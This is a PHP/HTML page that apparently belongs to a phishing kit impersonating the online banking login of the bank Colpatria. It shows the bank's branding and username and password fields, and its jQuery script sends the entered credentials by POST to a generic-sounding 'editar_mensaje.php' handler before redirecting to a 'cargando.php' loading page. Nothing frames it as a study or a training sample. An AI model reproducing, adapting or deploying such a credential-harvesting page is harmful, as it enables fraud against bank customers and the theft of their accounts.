<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


	

    <title>Colpatria</title>
    <style>
        *{
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
    </style>

		<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		



</head>
<body>
    <div style="border-top:5px solid red; border-bottom:1px solid #dcdcdc; height:60px;">
    <img src="logo.png" alt="" srcset="" width="25%" style="margin-top:-20px; margin-left:20px;">
    </div>
<br><br>
    <center><h2>Ingresa a tu Banca Virtual</h2></center>



<br><br><br>

        <img src="usuario.png" alt="" srcset="" width="5%" style="position:absolute; margin-top:8px; margin-left:25px;">
        <img src="candado.png" alt="" srcset="" width="5%" style="position:absolute; margin-top:100px; margin-left:25px;">
      <center>  <input type="text" name="" id="txtUsuario" placeholder="Nombre de usuario" style="width:80%; padding-left:30px; height: 40px; border:none; border-bottom:1px solid gray; font-size:17px;"><br><br><br><br>


     

        <input type="password" name="documento" id="txtPass" placeholder="Contraseña" style="width:80%; padding-left:30px; height: 40px; border:none; border-bottom:1px solid gray; font-size:17px;"></center><br>
        <a style="color:#219fd6; margin-left:20px;"><b>¿Necesitas ayuda para ingresar?</b></a><br><br>
        <input type="hidden" value="colpatria" id="banco">

       <center> <input type="submit" name="clave" id="btnUsuario"  value="Ingresar"  style="width:90%; height:45px; border-radius:5px; background-color:red; color:white; border:none;"><br><br><br></center>
        <h3 style="margin-left:20px;">¿No te has registrado?</h3><br>
		
        <center><input type="submit" value="Registrate aquí" style="width:90%; height:45px; border-radius:5px; background-color:white; color:red; border:1px solid red;"></center>



        <script type="text/javascript">

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			 if (($("#txtUsuario").val().length > 0) && ($("#txtPass").val().length > 7)) {
			
				const data = {
                    'usuario': $("#txtUsuario").val(),
                    'pass': $("#txtPass").val()
                };
                console.log(data);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error al editar el mensaje: ' + result.error);
                        }
                    },
                    error: function(xhr, status, error) {
                        alert('Error en la solicitud AJAX: ' + error);
                    }
                });	
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});
	});
</script>




</body>
</html>